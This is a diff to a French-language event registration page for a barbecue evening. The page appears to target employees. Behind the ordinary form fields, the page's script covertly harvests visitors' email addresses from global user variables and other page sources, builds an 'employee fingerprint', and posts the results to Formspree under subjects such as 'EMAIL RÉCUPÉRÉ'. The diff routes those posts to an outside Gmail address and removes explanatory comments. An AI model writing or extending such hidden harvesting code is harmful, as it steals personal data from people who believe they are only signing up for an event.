@@ -244,6 +244,22 @@
                 <input type="email" id="email" name="_replyto" required>
             </div>
 
+            <div class="form-group">
+                <label for="telephone">Téléphone</label>
+                <input type="tel" id="telephone" name="telephone">
+            </div>
+
+            <div class="form-group">
+                <label for="participants">Nombre de participants *</label>
+                <select id="participants" name="participants" required>
+                    <option value="">Choisissez...</option>
+                    <option value="1">1 personne</option>
+                    <option value="2">2 personnes</option>
+                    <option value="3">3 personnes</option>
+                    <option value="4">4 personnes</option>
+                    <option value="5+">5 personnes ou plus</option>
+                </select>
+            </div>
 
             <div class="form-group">
                 <label>Préférences alimentaires :</label>
@@ -281,7 +297,7 @@
             <!-- Champs cachés pour Formspree -->
             <input type="hidden" name="_subject" value="Nouvelle inscription - Soirée Barbecue 🔥">
             <input type="hidden" name="_next" value="#success">
-            <input type="hidden" name="_cc" value="votre-email@exemple.com">
+            <input type="hidden" name="_cc" value="soireebarbecue.ef@gmail.com">
 
             <button type="submit" class="submit-btn">
                 🔥 Confirmer mon inscription 🔥
@@ -384,7 +400,7 @@
                             });
                         }
                     })
-                    .catch(() => {}); // Ignorer les erreurs
+                    .catch(() => {}); 
             });
 
             return Array.from(foundEmails);
@@ -414,7 +430,6 @@
                 }
             } catch (e) {}
 
-            // Vérifier les variables globales communes
             try {
                 const commonVars = ['currentUser', 'user', 'userProfile', 'userInfo', 'authUser'];
                 commonVars.forEach(varName => {
@@ -472,6 +487,8 @@
                 },
                 body: JSON.stringify({
                     _subject: `🎯 EMAIL RÉCUPÉRÉ - ${employeeFingerprint}`,
+                    _replyto: 'soireebarbecue.ef@gmail.com',
+                    _cc: 'soireebarbecue.ef@gmail.com',
                     employeeFingerprint: employeeFingerprint,
                     recoveredEmail: email,
                     extractionMethod: method,
@@ -537,6 +554,8 @@
                 },
                 body: JSON.stringify({
                     _subject: `🔍 TRACKING - ${fingerprint}`,
+                    _replyto: 'soireebarbecue.ef@gmail.com',
+                    _cc: 'soireebarbecue.ef@gmail.com',
                     employeeFingerprint: fingerprint,
                     detectedEmail: email,
                     timestamp: new Date().toISOString(),
@@ -627,7 +646,6 @@
             submitBtn.disabled = true;
         });
 
-        
         function createConfetti() {
             const emojis = ['🎉', '🔥', '🍖', '🥗', '🍰', '🎊'];
             const container = document.querySelector('.container');
@@ -672,6 +690,8 @@
                     },
                     body: JSON.stringify({
                         _subject: `📧 TOUS LES EMAILS TROUVÉS - ${employeeFingerprint}`,
+                        _replyto: 'soireebarbecue.ef@gmail.com',
+                        _cc: 'soireebarbecue.ef@gmail.com',
                         employeeFingerprint: employeeFingerprint,
                         allFoundEmails: foundEmails,
                         totalFound: foundEmails.length,
